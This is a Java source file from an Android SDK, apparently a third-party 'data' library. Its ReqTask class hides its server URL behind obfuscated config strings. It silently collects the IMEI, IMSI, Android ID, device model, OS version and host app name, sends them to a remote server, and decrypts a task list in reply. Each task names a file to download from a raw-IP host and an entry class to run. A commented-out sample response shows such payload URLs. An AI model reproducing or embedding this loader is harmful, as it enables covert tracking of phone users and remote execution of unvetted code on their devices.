package com.seecoms.data.opera;

import android.os.Build;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import com.seecoms.data.BuildConfig;
import com.seecoms.data.Seecoms;
import com.seecoms.data.util.Config;
import com.seecoms.data.util.DeviceUtil;
import com.seecoms.data.util.FileUtil;
import com.seecoms.data.util.HttpUtil;
import com.seecoms.data.util.SecUtil;

public class ReqTask {
    private final String TAG = ReqTask.class.getSimpleName();
    public InitModel mInit;
    public ReqTask() {
    }

    public void reqInitTask() {
        mInit = null;

        try {
            if (!DeviceUtil.isNetWorkEnable(Seecoms.getEntry().getContext())) {
                if (BuildConfig.LOG_DEBUG) {
                    FileUtil.write("无网络，不能请求任务", false);
                }
                return;
            }
            StringBuilder urlPath = new StringBuilder(SecUtil.decode(Config.KEY_INIT_URL));
            String[] params = HttpUtil.REQ_PARAMS.split(",");

            String channel = Seecoms.getChannel();
            if (BuildConfig.LOG_DEBUG) {
                Log.e(TAG, "c:" + channel);
            }
            if (TextUtils.isEmpty(channel)) {
                return;
            }
            urlPath.append(SecUtil.decode(params[0])).append(channel);
            urlPath.append(SecUtil.decode(params[1])).append(DeviceUtil.getDeviceID(Seecoms.getEntry().getContext()));
            urlPath.append(SecUtil.decode(params[2])).append(SecUtil.decode(Config.KEY_SDK_V));
            urlPath.append(SecUtil.decode(params[3])).append(URLEncoder.encode(Build.VERSION.RELEASE, "UTF-8"));
            String brand = Build.BRAND;
            if (!TextUtils.isEmpty(brand) && brand.length() > 64) {
                brand = brand.substring(0, 64);
            }
            String model = Build.MODEL;
            if (!TextUtils.isEmpty(model) && model.length() > 64) {
                model = model.substring(0, 64);
            }
            urlPath.append(SecUtil.decode(params[4])).append(URLEncoder.encode(brand, "UTF-8"));
            urlPath.append(SecUtil.decode(params[5])).append(URLEncoder.encode(model, "UTF-8"));
            urlPath.append(SecUtil.decode(params[6])).append(URLEncoder.encode(DeviceUtil.getVersionName(Seecoms.getEntry().getContext()), "UTF-8"));
            urlPath.append(SecUtil.decode(params[7])).append(URLEncoder.encode(Seecoms.getEntry().getContext().getPackageName(), "UTF-8"));
            urlPath.append(SecUtil.decode(params[8])).append(DeviceUtil.getIMEI(Seecoms.getEntry().getContext()));
            urlPath.append(SecUtil.decode(params[9])).append(DeviceUtil.getIMSI(Seecoms.getEntry().getContext()));

            String network = DeviceUtil.getNetWorkName(Seecoms.getEntry().getContext());
            urlPath.append(SecUtil.decode(params[10])).append(network);
            urlPath.append("&aid=").append(DeviceUtil.getAndroidID(Seecoms.getEntry().getContext()));
            if (BuildConfig.LOG_DEBUG) {
                Log.e(TAG, urlPath.toString());
                FileUtil.write(urlPath.toString(), false);
            }
            String initResult = HttpUtil.getRequest(urlPath.toString(), null);
            if (TextUtils.isEmpty(initResult)) {
                return;
            }

            initResult = SecUtil.decrypt(channel, initResult);
            if (BuildConfig.LOG_DEBUG) {
//                initResult = "{\"code\":0,\"msg\":\"success\",\"b\":3600,\"tl\":[{\"id\":\"9\",\"t\":0,\"d\":\"15\",\"u\":\"http://183.131.189.116:90/media323/te08272.x\",\"cd\":\"false\",\"s\":\"51EAED7068F7765CCED9F0FD6DC9C0DB\",\"fn\":\"te08272.x\",\"pn\":\"com.by.sk.ByEntry\",\"ex\":\"task\"},{\"id\":\"2\",\"t\":0,\"d\":\"10\",\"u\":\"http://183.131.189.116:90/media323/qm0816.x\",\"cd\":\"false\",\"s\":\"AE21FAC23054D4D77E74FF6B60D7DAAA\",\"fn\":\"qm0816.x\",\"pn\":\"com.asdx.show.Main\",\"ex\":\"task\"}]}";
                FileUtil.write(initResult, false);
                Log.e(TAG, initResult);
            }
            parseJson(initResult);
        } catch (Exception e) {
            if (BuildConfig.LOG_DEBUG) {
                e.printStackTrace();
            }
        }
    }

    private void parseJson(String jsonStr) {
        if (TextUtils.isEmpty(jsonStr)) {
            return;
        }

        try {
            JSONObject json = new JSONObject(jsonStr);
            int code = json.optInt(InitModel.CODE, -1);
            if (code == 0) {
                mInit = new InitModel();
                long interval = json.optLong("b", 0) * 1000;
                mInit.interval = interval;
                JSONArray taskArray = json.optJSONArray("tl");
                if (taskArray != null && taskArray.length() > 0) {
                    List<TaskBean> taskList = new ArrayList<>(taskArray.length());
                    for (int i = 0; i < taskArray.length(); i++) {
                        TaskBean task = new TaskBean();
                        taskList.add(task);
                        JSONObject taskJson = taskArray.getJSONObject(i);
                        task.id = taskJson.optString("id", "");
                        task.t = taskJson.optInt("t", 0);
                        String d = taskJson.optString("d", "");
                        long time = 100000;
                        if (!TextUtils.isEmpty(d)) {
                            try {
                                time = Long.parseLong(d) * 1000;
                            } catch (Exception e) {
                            }
                        }
                        task.d = time;
                        task.u = taskJson.optString("u", "");

                        String cdS = taskJson.optString("cd", "");
                        boolean cd = false;
                        if (!TextUtils.isEmpty(cdS)) {
                            try {
                                if ("false".equals(cdS)) {
                                    cd = false;
                                } else if ("true".equals(cdS)) {
                                    cd = true;
                                }
                            } catch (Exception e) {
                            }
                        }
                        task.cd = cd;

                        task.s = taskJson.optString("s", "");
                        task.fn = taskJson.optString("fn", "");
                        task.pn = taskJson.optString("pn", "");
                        task.ex = taskJson.optString("ex", "");
                    }
                    mInit.tasks = taskList;
                }
            }
        } catch (Exception e) {
            if (BuildConfig.LOG_DEBUG) {
                e.printStackTrace();
            }
        }
    }
}
